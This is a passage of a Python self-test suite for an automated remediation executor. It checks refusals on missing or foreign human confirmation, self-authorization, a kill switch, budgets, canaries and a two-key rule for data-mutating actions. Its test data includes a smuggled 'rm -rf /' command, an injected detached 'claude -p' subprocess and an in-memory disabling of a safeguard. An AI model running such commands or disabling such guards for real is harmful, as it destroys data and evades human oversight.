                         ).execute(dict(_ae_remedy, proposed_action=_ae_remedy["proposed_action"]), _ae_wl, _ae_conf()
                         ).get("refused") == AE.REFUSE_BELOW_FLOOR)

# RJ3 REFUSAL: the human confirmation bound to the proposal digest (the L2 key).
expect("WARP-1206 RJ3: a MISSING human confirmation REFUSES (L2 needs an explicit confirmation)",
       _ae_exec().execute(_ae_remedy, _ae_wl, None).get("refused") == AE.REFUSE_MISSING_CONFIRMATION)
expect("WARP-1206 RJ3: a non-confirming decision REFUSES",
       _ae_exec().execute(_ae_remedy, _ae_wl, _ae_conf(decision="declined")).get("refused") == AE.REFUSE_MISSING_CONFIRMATION)
expect("WARP-1206 NG4: a MACHINE-authored confirmation REFUSES (no self-authorization)",
       _ae_exec().execute(_ae_remedy, _ae_wl, _ae_conf(confirmed_by="veldo-executor")).get("refused") == AE.REFUSE_SELF_AUTHORIZATION)
expect("WARP-1206 NG4: a confirmation authored by the executor's OWN actor REFUSES (self-authorization)",
       _ae_exec().execute(_ae_remedy, _ae_wl, _ae_conf(confirmed_by="dmitry-executor")).get("refused") == AE.REFUSE_SELF_AUTHORIZATION)
expect("WARP-1206 RJ3: a FOREIGN confirmation (bound to a different proposal digest) REFUSES (C3)",
       _ae_exec().execute(_ae_remedy, _ae_wl, _ae_conf(proposal_digest="sha256:0000000000000000")).get("refused") == AE.REFUSE_FOREIGN_CONFIRMATION)
expect("WARP-1206 RJ3: a confirmation naming a FOREIGN incident REFUSES",
       _ae_exec().execute(_ae_remedy, _ae_wl, _ae_conf(incident="INC-OTHER")).get("refused") == AE.REFUSE_FOREIGN_CONFIRMATION)
# THE DIGEST-BINDING TOOTH: a proposal EDITED after it was confirmed is stale (its digest changed).
_ae_edited = dict(_ae_remedy, diagnosis=_ae_remedy["diagnosis"] + " (edited after confirmation)")
expect("WARP-1206 RJ3 TEETH: a proposal EDITED after confirmation is STALE and REFUSES (digest binding, C3)",
       _ae_exec().execute(_ae_edited, _ae_wl, _ae_conf(_ae_remedy)).get("refused") == AE.REFUSE_FOREIGN_CONFIRMATION)

# RJ3 REFUSAL: anything irreversible or data-mutating REFUSES pending the two-key rule (W7).
_ae_dm = dict(_ae_remedy, reversibility={"class": "reversible", "analysis": "mutates rows", "data_mutating": True},
              required_authorization="two_key")
expect("WARP-1206 RJ3: a DATA-MUTATING proposal REFUSES pending the two-key rule (W7); no data-mutating path here",
       _ae_exec().execute(_ae_dm, _ae_wl, _ae_conf(_ae_dm)).get("refused") == AE.REFUSE_REQUIRES_TWO_KEY)
_ae_irr = dict(_ae_remedy, reversibility={"class": "irreversible", "analysis": "cannot be undone", "data_mutating": False},
               required_authorization="two_key")
expect("WARP-1206 RJ3: an IRREVERSIBLE proposal REFUSES pending the two-key rule (W7)",
       _ae_exec().execute(_ae_irr, _ae_wl, _ae_conf(_ae_irr)).get("refused") == AE.REFUSE_REQUIRES_TWO_KEY)
_ae_2k = dict(_ae_remedy, required_authorization="two_key")
expect("WARP-1206 RJ3: a proposal requiring two_key authorization REFUSES (a single key cannot stand in, W7)",
       _ae_exec().execute(_ae_2k, _ae_wl, _ae_conf(_ae_2k)).get("refused") == AE.REFUSE_REQUIRES_TWO_KEY)

# RJ3 REFUSAL 4: a tripped kill switch halts EVERYTHING; reset needs a recorded highest-tier approval (D5).
_ae_kill = AE.KillSwitch(); _ae_kill.trip("any-human")
expect("WARP-1206 RJ3: a TRIPPED kill switch REFUSES everything (D5)",
       _ae_exec(kill=_ae_kill).execute(_ae_remedy, _ae_wl, _ae_conf()).get("refused") == AE.REFUSE_KILL_SWITCH)
expect("WARP-1206 D5: any human trips the kill switch instantly with no ceremony",
       _ae_kill.is_tripped() is True)
expect("WARP-1206 D5: resetting the kill switch WITHOUT a highest-tier approval REFUSES and it stays tripped",
       _ae_kill.reset({"decision": "approved", "tier": "high", "approver": "dmitry"}) is False and _ae_kill.is_tripped() is True)
expect("WARP-1206 D5: a reset approved by a MACHINE is refused (a human resets)",
       _ae_kill.reset({"decision": "approved", "tier": "critical", "approver": "veldo-executor"}) is False and _ae_kill.is_tripped() is True)
expect("WARP-1206 D5: resetting WITH a recorded highest-tier (critical) human approval succeeds",
       _ae_kill.reset({"decision": "approved", "tier": "critical", "approver": "dmitry"}) is True and _ae_kill.is_tripped() is False)

# RJ3 REFUSAL 5: an exhausted budget refuses. Positive control: a budget of 1 executes once.
expect("WARP-1206 RJ3: an EXHAUSTED action budget REFUSES",
       _ae_exec(budget=AE.ActionBudget(0)).execute(_ae_remedy, _ae_wl, _ae_conf()).get("refused") == AE.REFUSE_BUDGET_EXHAUSTED)
_ae_ex1 = _ae_exec(budget=AE.ActionBudget(1))
_ae_r1 = _ae_ex1.execute(_ae_remedy, _ae_wl, _ae_conf())
_ae_r2 = _ae_ex1.execute(_ae_remedy, _ae_wl, _ae_conf())
expect("WARP-1206 RJ3: a budget of 1 executes ONCE then REFUSES the second (consumed on engagement)",
       _ae_r1.get("executed") is True and _ae_r2.get("refused") == AE.REFUSE_BUDGET_EXHAUSTED)

# RJ3 REFUSAL 6: a timeout refuses. Positive control: within-timeout executes (the positive control above).
expect("WARP-1206 RJ3: an over-timeout ACTION REFUSES (timeout_exceeded)",
       _ae_exec(fake=AE.FakeActionSystem(action_elapsed=999), timeout=300).execute(_ae_remedy, _ae_wl, _ae_conf()).get("refused") == AE.REFUSE_TIMEOUT)
_ae_slowcanary = AE.FakeActionSystem(canary_elapsed=999)
_ae_sc = _ae_exec(fake=_ae_slowcanary, timeout=300).execute(_ae_remedy, _ae_wl, _ae_conf())
expect("WARP-1206 RJ3: an over-timeout CANARY REFUSES and the main action is NOT run",
       _ae_sc.get("refused") == AE.REFUSE_TIMEOUT and [o["op"] for o in _ae_slowcanary.ops] == ["canary"])

# RJ3 REFUSAL / CANARY-FIRST TOOTH: a FAILED canary refuses WITHOUT running the main action.
_ae_badcanary = AE.FakeActionSystem(canary_healthy=False)
_ae_bc = _ae_exec(fake=_ae_badcanary).execute(_ae_remedy, _ae_wl, _ae_conf())
expect("WARP-1206 RJ3 TEETH: a FAILED canary REFUSES and the main action is NOT run (canary-first stands guard)",
       _ae_bc.get("refused") == AE.REFUSE_CANARY_FAILED and [o["op"] for o in _ae_badcanary.ops] == ["canary"])
# An action that declares no canary runs the main directly (scale_pool, canary.supported false).
_ae_nc_remedy = dict(_ae_remedy, proposed_action={"action": "scale_pool", "parameters": {"pool": "workers", "replicas": 8}})
_ae_nc_fake = AE.FakeActionSystem()
_ae_nc = _ae_exec(fake=_ae_nc_fake, system="fake-pool-controller").execute(_ae_nc_remedy, _ae_wl, _ae_conf(_ae_nc_remedy))
expect("WARP-1206 O3: an action declaring no canary runs the main directly (sequence [action], no canary)",
       _ae_nc.get("executed") is True and _ae_nc.get("sequence") == ["action"] and _ae_nc.get("canary_ran") is False)

# L3 is disabled by default and lowest-class-only if ever enabled (D2); the whitelist floor is high.
_ae_l3 = dict(_ae_remedy, autonomy_level="L3")
expect("WARP-1206 D2: L3 is DISABLED by default and REFUSES (may never be enabled; a legitimate permanent state)",
       _ae_exec(level="L3").execute(_ae_l3, _ae_wl, _ae_conf(_ae_l3)).get("refused") == AE.REFUSE_L3_DISABLED)
expect("WARP-1206 D2: even if L3 were ENABLED, a HIGH-class whitelisted action REFUSES (lowest class only; floor is high)",
       _ae_exec(level="L3", l3_enabled=True).execute(_ae_l3, _ae_wl, _ae_conf(_ae_l3)).get("refused") == AE.REFUSE_L3_LOWEST_CLASS_ONLY)

# Autonomy sufficiency: a proposal may not need more than the system's level; a non-execution rung refuses.
expect("WARP-1206 C3: a proposal needing L3 at an L2 system REFUSES (autonomy insufficient, degrade down never up)",
       _ae_exec(level="L2").execute(_ae_l3, _ae_wl, _ae_conf(_ae_l3)).get("refused") == AE.REFUSE_AUTONOMY_INSUFFICIENT)
_ae_l1req = dict(_ae_remedy, autonomy_level="L1")
expect("WARP-1206 O3: a proposal requesting L1 (not an execution rung) REFUSES",
       _ae_exec(level="L2").execute(_ae_l1req, _ae_wl, _ae_conf(_ae_l1req)).get("refused") == AE.REFUSE_AUTONOMY_INSUFFICIENT)

# A stale (superseded) proposal and a proposal smuggling command text each refuse (invalid_proposal).
_ae_superseded = dict(_ae_remedy, status="superseded")
expect("WARP-1206 C3: a superseded proposal is stale and REFUSES (invalid_proposal)",
       _ae_exec().execute(_ae_superseded, _ae_wl, _ae_conf(_ae_superseded)).get("refused") == AE.REFUSE_INVALID_PROPOSAL)
_ae_cmd = dict(_ae_remedy, command="rm -rf /")
expect("WARP-1206 C4: a proposal smuggling a command field REFUSES (never command text; W1 proposal-not-execution)",
       _ae_exec().execute(_ae_cmd, _ae_wl, _ae_conf(_ae_cmd)).get("refused") == AE.REFUSE_INVALID_PROPOSAL)

# The proposal digest is deterministic and changes when the proposal changes (the binding is real).
expect("WARP-1206: proposal_digest is deterministic and changes with the proposal (a real binding)",
       AE.proposal_digest(_ae_remedy) == AE.proposal_digest(V.parse_yamlish(GOOD_REMEDY))
       and AE.proposal_digest(_ae_edited) != AE.proposal_digest(_ae_remedy)
       and AE.proposal_digest(_ae_remedy).startswith("sha256:"))

# C4 STRUCTURAL SEPARATION from the responder: distinct credential type, no read/investigation path.
_ae_c = _ae_cred()
expect("WARP-1206 C4: the executor credential is a DISTINCT type from the responder's read-only credential/handle",
       (not isinstance(_ae_c, (EV1206.ReadHandle, EV1206.ReadOnlyCredential)))
       and AE.ExecutorCredential is not EV1206.ReadOnlyCredential)
expect("WARP-1206 C4: the executor credential has NO query/read/open_read method (it is not an investigator)",
       not any(hasattr(_ae_c, m) for m in ("query", "read", "open_read", "insert", "update", "delete")))
expect("WARP-1206 C4: the ActionExecutor exposes no read/investigation method (separate code path from the responder)",
       not any(hasattr(AE.ActionExecutor, m) for m in ("query", "investigate", "propose", "open_read")))
expect("WARP-1206 C4: the responder harness carries NO execute method and no executor credential (W4 separation holds)",
       not hasattr(RESP1206.ResponderHarness, "execute") and not hasattr(RESP1206.ResponderHarness, "credential"))
_ae_ro = EV1206.ReadOnlyCredential("src", object())
try:
    AE.ActionExecutor(_ae_ro, _ae_ladder(), AE.KillSwitch(), AE.ActionBudget(5), AE.FakeActionSystem(), ACT, INC)
    _ae_rocred = False
except AE.ExecutorError:
    _ae_rocred = True
expect("WARP-1206 C4: the executor REFUSES construction with the responder's read-only credential (its credential must be its OWN)",
       _ae_rocred)

# C5/D4 the credential is a secret REFERENCE resolved at the seam, never a raw literal, and redacts itself.
try:
    AE.resolve_executor_credential("dmitry-executor", "fake-deploy-controller", "not-a-reference")
    _ae_raw = False
except Exception:
    _ae_raw = True
expect("WARP-1206 C5/D4: resolve_executor_credential REFUSES a raw literal secret (never a raw secret)", _ae_raw)
_ae_env_cred = AE.resolve_executor_credential("dmitry-executor", "fake-deploy-controller",
                                              "env:VELDO_EXEC_CRED", env={"VELDO_EXEC_CRED": "present"})
expect("WARP-1206 C5/D4: an env: secret reference resolves at the seam and the credential redacts its secret (never surfaced)",
       isinstance(_ae_env_cred, AE.ExecutorCredential) and AE.REDACTION_MARKER in repr(_ae_env_cred)
       and _ae_env_cred.context_view()["secret"] == AE.REDACTION_MARKER and "present" not in repr(_ae_env_cred))
expect("WARP-1206 C5: REDACTION_MARKER mirrors evidence.REDACTION_MARKER (no drift across the method)",
       AE.REDACTION_MARKER == EV1206.REDACTION_MARKER)

# NG4 NO SELF-ESCALATION: the executor exposes none of the ladder/whitelist/kill-switch/budget mutators.
expect("WARP-1206 NG4: the executor exposes NONE of the self-escalation/mutator methods (no raise-level, enable-l3, edit-whitelist, reset-kill-switch, set-budget)",
       not any(hasattr(AE.ActionExecutor, m) for m in AE.FORBIDDEN_ESCALATION_METHODS))


class _AEEscalate(AE.ActionExecutor):
    def raise_level(self):
        return "escalated"


expect("WARP-1206 NG4 TEETH: a subclass ADDING a self-escalation method is detected (the no-escalation check is non-vacuous)",
       any(hasattr(_AEEscalate, m) for m in AE.FORBIDDEN_ESCALATION_METHODS))

# NG3 IN-SESSION only, no detached process, mirroring the sibling organs.
_ae_src = (ROOT / ".veldo/action_executor.py").read_text()
expect("WARP-1206 NG3: action_executor.py starts no detached/background process (no subprocess/Popen/threading/multiprocessing/asyncio/setsid/nohup/claude -p)",
       not any(t in _ae_src for t in _TRIP_DETACH_TOKENS))
expect("WARP-1206 NG3: action_executor.py imports no process/thread machinery at module scope (pathlib/json/hashlib; importlib lazily)",
       "import subprocess" not in _ae_src and "import threading" not in _ae_src
       and "import multiprocessing" not in _ae_src and "import asyncio" not in _ae_src)
_ae_mut_popen = _ae_src + '\nimport subprocess as _s\n_p = _s.Popen(["claude", "-p", "x"], start_new_session=True)\n'
expect("WARP-1206 NG3 TEETH: a detached subprocess.Popen(claude -p) mutation turns the no-detach check RED",
       any(t in _ae_mut_popen for t in _TRIP_DETACH_TOKENS))
expect("WARP-1206 NG3: the no-detach mutation is in-memory only (the real module on disk is byte-unchanged)",
       (ROOT / ".veldo/action_executor.py").read_text() == _ae_src)

# AC5 byte-identical engine sync across root, engine, and all 6 packs.
expect("WARP-1206 AC5: .veldo/action_executor.py is byte-identical root vs engine",
       (ROOT / ".veldo/action_executor.py").read_bytes() == (ROOT / "engine/.veldo/action_executor.py").read_bytes())
expect("WARP-1206 AC5: .veldo/action_executor.py is byte-identical across all 6 packs",
       (ROOT / ".veldo/action_executor.py").read_bytes() == (ROOT / "engine/.veldo/action_executor.py").read_bytes())
expect("WARP-1206 AC5: .veldo/capabilities.yaml is byte-identical root vs engine and across all 6 packs",
       (ROOT / ".veldo/capabilities.yaml").read_bytes() == (ROOT / "engine/.veldo/capabilities.yaml").read_bytes()
       and (ROOT / ".veldo/capabilities.yaml").read_bytes() == (ROOT / "engine/.veldo/capabilities.yaml").read_bytes())
expect("WARP-1206 AC5: the action_executor capability is declared mechanical with home .veldo/action_executor.py",
       bool(re.search(r"(?m)^\s{2}action_executor:\s*\{status:\s*mechanical,\s*home:\s*\.veldo/action_executor\.py\b", (ROOT / ".veldo/capabilities.yaml").read_text())))

# AC5 dogfood: HIGH RISK and human_approval REQUIRED (C2), placement resolves, no protected path touched.
_p1206_fm = V.parse_yamlish(re.match(r"^---\n(.*?)\n---", (ROOT / "specs/WARP-1206-the-execution-organ.md").read_text(), re.S).group(1))
_p1206_arch, _p1206_contract = V.load_repo_contract(repo_root=str(ROOT))
expect("WARP-1206 dogfood: the spec placement resolves and passes the mandatory placement gate (tier standard, no boundary crossing)",
       _p1206_contract is not None and _p1206_arch.placement_gate(_p1206_fm, _p1206_contract) == []
       and _p1206_arch.footprint_tier_floor(_p1206_fm, _p1206_contract) == "")
expect("WARP-1206 dogfood: HIGH RISK and human_approval REQUIRED (C2, the enforcement core), and no protected path is touched",
       _p1206_arch._risk_word(_p1206_fm.get("risk")) == "high" and _p1206_fm.get("human_approval") == "required"
       and (_p1206_fm.get("protected_paths") or []) == [])

# --- the two-key rule (WARP-1207, W7 of PLAN-0012): the SECOND KEY PATH on top of the execution
# organ, the gate through which an IRREVERSIBLE or DATA-MUTATING remediation may finally execute.
# For any such action (or a remedy requiring two_key) the executor no longer dead-ends: it routes to
# the generic two-key gate (.veldo/two_key.py), and execution requires BOTH keys, each BOUND TO THE
# PROPOSAL DIGEST - (KEY 1) a recorded HUMAN authorization (veldo.approval-style) and (KEY 2) an
# INDEPENDENT FRESH-CONTEXT confirmation (veldo.verdict-style) that the diagnosis supports the action
# and the action does only what it claims. EITHER KEY ALONE REFUSES (fail closed, C3); a foreign or
# stale (digest-mismatched), expired, foreign-incident, machine-authored (KEY 1), or self-authored
# (KEY 2 == proposer/executor/authorizer/organ, NG4) key each refuse with a NAMED reason; both keys
# present, granting, unexpired, self-separated, and bound to the SAME digest EXECUTE against the fake
# system (the two-key success is real - the op log shows the action ran). Because this OPENS the
# data-mutating execution path, W7 is CRITICAL (C2), where W6 was HIGH. The refusals ARE the product.
_tkspec = importlib.util.spec_from_file_location("veldo_two_key", ROOT / ".veldo/two_key.py")
TK = importlib.util.module_from_spec(_tkspec); _tkspec.loader.exec_module(TK)

_TK_NOW = "2026-07-23T12:00:00Z"

# A DATA-MUTATING (and irreversible) whitelisted action against a FAKE system, reviewed and
# digest-current so it is admitted to the whitelist (W5). The shipped D3 trio are all reversible/high,
# so the two-key path needs a critical, data-mutating action to bind to; it lives here as a fixture
# (no new shipped example), exactly as W6 proved its refusals with fixtures.
_TK_ACTION_SRC = """schema: veldo.action/v1
id: purge_stale_rows
title: Purge stale rows from a data store
system: fake-data-store
risk_class: critical
reversibility:
  class: irreversible
  analysis: A purge deletes rows and cannot be undone; it mutates persistent data.
  data_mutating: true
parameters:
  - name: table
    type: string
    required: true
    pattern: "^[a-z][a-z0-9_]{1,62}$"
rollback: Restore the purged rows from the pre-purge snapshot (a manual, out-of-band recovery).
canary:
  supported: true
  shape: run the purge against a shadow copy first and compare row counts before the live purge.
review:
  status: reviewed
  reviewer: illustrative fresh-context review (example only)
  verdict: approved
  reviewed_at: 2026-07-23T00:00:00Z
  reviewed_digest: sha256:0000000000000000
"""
_tk_action_dig = ACT.action_digest(V.parse_yamlish(_TK_ACTION_SRC))
_tk_action = V.parse_yamlish(_TK_ACTION_SRC.replace("sha256:0000000000000000", _tk_action_dig))
_tk_wl = {}
with tempfile.TemporaryDirectory() as _tkd:
    _tkadir = Path(_tkd) / ".veldo" / "actions"
    _tkadir.mkdir(parents=True)
    (_tkadir / "purge.yaml").write_text(_TK_ACTION_SRC.replace("sha256:0000000000000000", _tk_action_dig))
    _tk_wl, _tk_wle = ACT.build_whitelist(_tkadir, V.parse_yamlish, V.fail)
expect("WARP-1207 setup: a critical, data-mutating action is admitted to the whitelist (reviewed, digest-current)",
       _tk_wle == 0 and "purge_stale_rows" in _tk_wl)

# The remediation PROPOSAL that binds the data-mutating action, required_authorization two_key,
# proposed_by naming the responder that authored it (so the self-separation guard has a proposer).
_tk_remedy = {
    "schema": "veldo.remedy/v1", "id": "REM-2K", "incident": "INC-2K", "status": "proposed",
    "diagnosis": "the stale-row buildup on the implicated table is the regression; purging it restores headroom.",
    "proposed_by": "responder-alpha",
    "evidence": [{"citation": "row-count gauge on the implicated table, read-only replica view"},
                 {"citation": "change record and proof for the deploy that crossed the boundary"}],
    "proposed_action": {"action": "purge_stale_rows", "parameters": {"table": "sessions"}},
    "risk_class": "critical", "autonomy_level": "L2",
    "reversibility": {"class": "irreversible", "analysis": "a purge cannot be undone; it mutates data.", "data_mutating": True},
    "rollback": "Restore the purged rows from the pre-purge snapshot.",
    "canary": {"supported": True, "shape": "purge a shadow copy first and compare row counts."},
    "required_authorization": "two_key",
}
expect("WARP-1207 setup: the two-key remedy validates clean through the W1 contract (a proposal missing nothing)",
       INC.validate_remedy(_tk_remedy, str(ROOT), "selftest.remedy2k", V.fail) == 0)
_tk_dig = AE.proposal_digest(_tk_remedy)

# The TWO keys, each bound to the proposal digest.
_tk_human = {"schema": "veldo.approval/v1", "decision": "approved", "approver": "operator",
             "proposal_digest": _tk_dig, "incident": "INC-2K",
             "recorded_at": "2026-07-23T00:00:00Z", "expires_at": "2027-01-01T00:00:00Z"}
_tk_conf = {"schema": "veldo.verdict/v1", "verdict": "pass", "confirmer": "reviewer-beta",
            "diagnosis_supports_action": True, "action_does_only_what_it_claims": True,
            "proposal_digest": _tk_dig, "incident": "INC-2K",
            "confirmed_at": "2026-07-23T00:00:00Z", "expires_at": "2027-01-01T00:00:00Z"}


def _tk_ex(system="fake-data-store", kill=None, budget=None, timeout=300, fake=None):
    return AE.ActionExecutor(
        AE.ExecutorCredential("svc-executor", system, object()),
        AE.AutonomyLadder(levels={system: "L2"}),
        kill if kill is not None else AE.KillSwitch(),
        budget if budget is not None else AE.ActionBudget(5),
        fake if fake is not None else AE.FakeActionSystem(),
        ACT, INC, timeout_seconds=timeout)


# WARP-0621 (W8): the risky branch now also requires an EXECUTION BINDING. These existing W7
# assertions were written before it existed and drive the two-key path, so the helper supplies a
# valid binding by default - otherwise every one of them would be measuring the new guard's
# absent-binding refusal instead of the two-key property it was written to prove. Passing
# binding=None is how the new legs below drive the absent case deliberately.
_ebspec = importlib.util.spec_from_file_location("veldo_execution_binding",
                                                ROOT / ".veldo/execution_binding.py")
EB = importlib.util.module_from_spec(_ebspec); _ebspec.loader.exec_module(EB)
_TK_ENV, _TK_STATE = "fake-production", "state-digest-abc123"
_tk_params = (_tk_remedy.get("proposed_action") or {}).get("parameters") or {}


def _tk_binding(nonce="b" * 32, **over):
    b = EB.issue(nonce=nonce, expires_at="2027-01-01T00:00:00Z", target="purge_stale_rows",
                 system="fake-data-store", environment=_TK_ENV, parameters=_tk_params,
                 state_digest=_TK_STATE, proposal_digest=_tk_dig)
    b.update(over)
    return b


def _tk_ctx(**over):
    c = {"environment": _TK_ENV, "state_digest": _TK_STATE}
    c.update(over)
    return c


def _tk_run(human=..., conf=..., remedy=None, fake=None, budget=None, kill=None, now=_TK_NOW,
            binding=..., ctx=None, store=None):
    h = _tk_human if human is ... else human
    c = _tk_conf if conf is ... else conf
    b = _tk_binding() if binding is ... else binding
    return _tk_ex(fake=fake, budget=budget, kill=kill).execute(
        remedy if remedy is not None else _tk_remedy, _tk_wl,
        human_authorization=h, independent_confirmation=c, now=now,
        execution_binding=b, binding_context=(ctx if ctx is not None else _tk_ctx()),
        nonce_store=store)


# RJ4 POSITIVE CONTROL: an irreversible/data-mutating action executes with BOTH keys bound to the digest.
_tk_fake = AE.FakeActionSystem()
_tk_ok = _tk_run(fake=_tk_fake)
expect("WARP-1207 RJ4 positive: an irreversible/data-mutating action EXECUTES with BOTH keys bound to the proposal digest",
       _tk_ok.get("executed") is True and _tk_ok.get("refused") is None and _tk_ok.get("action") == "purge_stale_rows")
expect("WARP-1207 RJ4: the two-key run is REAL - the fake system op log shows the action ran, canary-FIRST",
       [o["op"] for o in _tk_fake.ops] == ["canary", "action"] and _tk_ok.get("sequence") == ["canary", "action"])
expect("WARP-1207 RJ4: the executed result records two_key provenance (authorized_by KEY 1, confirmed_by KEY 2) and the digest",
       _tk_ok.get("two_key") is True and _tk_ok.get("authorized_by") == "operator"
       and _tk_ok.get("confirmed_by") == "reviewer-beta" and _tk_ok.get("proposal_digest") == _tk_dig)

# RJ4 EITHER KEY ALONE REFUSES (fail closed, C3). Removing either key reverts the run to a refusal.
expect("WARP-1207 RJ4: the HUMAN authorization ALONE (no independent confirmation) REFUSES (either key alone)",
       _tk_run(conf=None).get("refused") == TK.MISSING_INDEPENDENT_CONFIRMATION)
expect("WARP-1207 RJ4: the INDEPENDENT confirmation ALONE (no human authorization) REFUSES (either key alone)",
       _tk_run(human=None).get("refused") == TK.MISSING_HUMAN_AUTHORIZATION)
expect("WARP-1207 RJ4: NEITHER key REFUSES with the canonical two-key fence (requires_two_key, the W6 value preserved)",
       _tk_run(human=None, conf=None).get("refused") == AE.REFUSE_REQUIRES_TWO_KEY)

# RJ4 DIGEST BINDING (C4): a key bound to a DIFFERENT proposal digest is foreign/stale and refuses.
expect("WARP-1207 RJ4: a human authorization bound to a DIFFERENT proposal digest REFUSES (foreign/stale)",
       _tk_run(human=dict(_tk_human, proposal_digest="sha256:0000000000000000")).get("refused") == TK.FOREIGN_AUTHORIZATION)
expect("WARP-1207 RJ4: an independent confirmation bound to a DIFFERENT proposal digest REFUSES (foreign/stale)",
       _tk_run(conf=dict(_tk_conf, proposal_digest="sha256:0000000000000000")).get("refused") == TK.FOREIGN_CONFIRMATION)
# THE STALE TOOTH: a proposal EDITED after both keys were signed changes its digest, so the keys go stale.
_tk_edited = dict(_tk_remedy, diagnosis=_tk_remedy["diagnosis"] + " (edited after the keys were signed)")
expect("WARP-1207 RJ4 TEETH: a proposal EDITED after both keys were signed is STALE and REFUSES (digest binding, C3)",
       AE.proposal_digest(_tk_edited) != _tk_dig
       and _tk_run(remedy=_tk_edited).get("refused") == TK.FOREIGN_AUTHORIZATION)
# A key naming a FOREIGN incident refuses.
expect("WARP-1207 RJ4: a human authorization naming a FOREIGN incident REFUSES",
       _tk_run(human=dict(_tk_human, incident="INC-OTHER")).get("refused") == TK.FOREIGN_AUTHORIZATION)
expect("WARP-1207 RJ4: an independent confirmation naming a FOREIGN incident REFUSES",
       _tk_run(conf=dict(_tk_conf, incident="INC-OTHER")).get("refused") == TK.FOREIGN_CONFIRMATION)

# RJ4 FRESHNESS: an expired key refuses; a key that declares no expiry refuses (fail closed).
expect("WARP-1207 RJ4: an EXPIRED human authorization REFUSES (fail closed)",
       _tk_run(human=dict(_tk_human, expires_at="2020-01-01T00:00:00Z")).get("refused") == TK.AUTHORIZATION_EXPIRED)
expect("WARP-1207 RJ4: an EXPIRED independent confirmation REFUSES (fail closed)",
       _tk_run(conf=dict(_tk_conf, expires_at="2020-01-01T00:00:00Z")).get("refused") == TK.CONFIRMATION_EXPIRED)
expect("WARP-1207: a human authorization declaring NO expiry REFUSES (a key must declare an expiry, fail closed)",
       _tk_run(human={k: v for k, v in _tk_human.items() if k != "expires_at"}).get("refused") == TK.AUTHORIZATION_EXPIRED)

# NG4 KEY 1 must be a HUMAN: a machine-authored authorization, or the executor's own actor, refuses.
expect("WARP-1207 NG4: a MACHINE-authored human authorization REFUSES (KEY 1 must be a human; no self-authorization)",
       _tk_run(human=dict(_tk_human, approver="veldo-executor")).get("refused") == TK.SELF_AUTHORIZATION)
expect("WARP-1207 NG4: a human authorization by the executor's OWN actor REFUSES (the executor never authorizes its own execution)",
       _tk_run(human=dict(_tk_human, approver="svc-executor")).get("refused") == TK.SELF_AUTHORIZATION)

# NG4 KEY 2 must be INDEPENDENT (self-separation extended to remediation): the confirmer cannot be
# the proposer/producer, the executor's actor, the human authorizer, or a responder/executor organ.
expect("WARP-1207 NG4: a SELF-authored confirmation (confirmer == the remedy's proposer) REFUSES (not independent)",
       _tk_run(conf=dict(_tk_conf, confirmer="responder-alpha")).get("refused") == TK.CONFIRMATION_NOT_INDEPENDENT)
expect("WARP-1207 NG4: a confirmation by the executor's OWN actor REFUSES (the executor never confirms its own execution)",
       _tk_run(conf=dict(_tk_conf, confirmer="svc-executor")).get("refused") == TK.CONFIRMATION_NOT_INDEPENDENT)
expect("WARP-1207 NG4: a confirmation by the SAME party as the human authorizer REFUSES (two keys = two parties)",
       _tk_run(conf=dict(_tk_conf, confirmer="operator")).get("refused") == TK.CONFIRMATION_NOT_INDEPENDENT)
expect("WARP-1207 NG4: a confirmer that is a responder/executor ORGAN identity REFUSES (not an independent fresh context)",
       _tk_run(conf=dict(_tk_conf, confirmer="veldo-responder")).get("refused") == TK.CONFIRMATION_NOT_INDEPENDENT)

# The keys must actually GRANT: an unapproved authorization and an unconfirming verdict refuse.
expect("WARP-1207: a human authorization that is not 'approved' REFUSES (authorization_not_granted)",
       _tk_run(human=dict(_tk_human, decision="rejected")).get("refused") == TK.AUTHORIZATION_NOT_GRANTED)
expect("WARP-1207: a confirmation whose verdict does not confirm (fail) REFUSES (confirmation_not_granted)",
       _tk_run(conf=dict(_tk_conf, verdict="fail")).get("refused") == TK.CONFIRMATION_NOT_GRANTED)
expect("WARP-1207: a confirmation NOT attesting diagnosis_supports_action REFUSES",
       _tk_run(conf=dict(_tk_conf, diagnosis_supports_action=False)).get("refused") == TK.CONFIRMATION_NOT_GRANTED)
expect("WARP-1207: a confirmation NOT attesting action_does_only_what_it_claims REFUSES",
       _tk_run(conf=dict(_tk_conf, action_does_only_what_it_claims=False)).get("refused") == TK.CONFIRMATION_NOT_GRANTED)
expect("WARP-1207: pass_with_notes is a confirming verdict too (positive control: both keys still execute)",
       _tk_run(conf=dict(_tk_conf, verdict="pass_with_notes"), fake=AE.FakeActionSystem()).get("executed") is True)

# The standing safeguards still stand on the two-key path: a tripped kill switch and an exhausted
# budget each refuse BEFORE the run (positive control: the both-keys run above executed).
_tk_kill = AE.KillSwitch(); _tk_kill.trip("any-human")
expect("WARP-1207: a TRIPPED kill switch REFUSES the two-key path too (the safeguards stand on every run)",
       _tk_run(kill=_tk_kill).get("refused") == AE.REFUSE_KILL_SWITCH)
expect("WARP-1207: an EXHAUSTED budget REFUSES the two-key path too",
       _tk_run(budget=AE.ActionBudget(0)).get("refused") == AE.REFUSE_BUDGET_EXHAUSTED)

# THE L2 SINGLE-CONFIRMATION PATH IS UNCHANGED (W6 preserved, zero regression): a strictly reversible,
# non-data-mutating action still executes with ONE human confirmation and does NOT require two keys.
expect("WARP-1207: a reversible non-data-mutating action still executes with the SINGLE L2 confirmation (W6 path unchanged)",
       _ae_exec(fake=AE.FakeActionSystem()).execute(_ae_remedy, _ae_wl, _ae_conf()).get("executed") is True)
expect("WARP-1207: the reversible L2 run records two_key False (single-confirmation provenance)",
       _ae_exec().execute(_ae_remedy, _ae_wl, _ae_conf()).get("two_key") is False)

# ANTI-VACUITY GUARD-MUTATION TEETH (C1): neutralize a guard in an IN-MEMORY copy of two_key.py and a
# formerly-refused input authorizes; the real module on disk is byte-unchanged. The exec'd source
# defines authorize into a fresh namespace whose globals resolve the module's own helpers.
_tk_src = (ROOT / ".veldo/two_key.py").read_text()


def _tk_mut(src):
    g = {}
    exec(compile(src, "<two_key_mut>", "exec"), g)
    return g


# TOOTH 1 - the self-separation guard (confirmer == proposer): neutralize it and a self-authored
# confirmation authorizes.
_tk_selfconf = dict(_tk_conf, confirmer="responder-alpha")
_r_real = TK.authorize(_tk_remedy, _tk_dig, _tk_human, _tk_selfconf, executor_actor="svc-executor", now=_TK_NOW)[0]
_g1 = _tk_mut(_tk_src.replace('    if _is_str(proposer) and cf == _norm(proposer):',
                              '    if False and _is_str(proposer) and cf == _norm(proposer):'))
_r_mut = _g1["authorize"](_tk_remedy, _tk_dig, _tk_human, _tk_selfconf, executor_actor="svc-executor", now=_TK_NOW)[0]
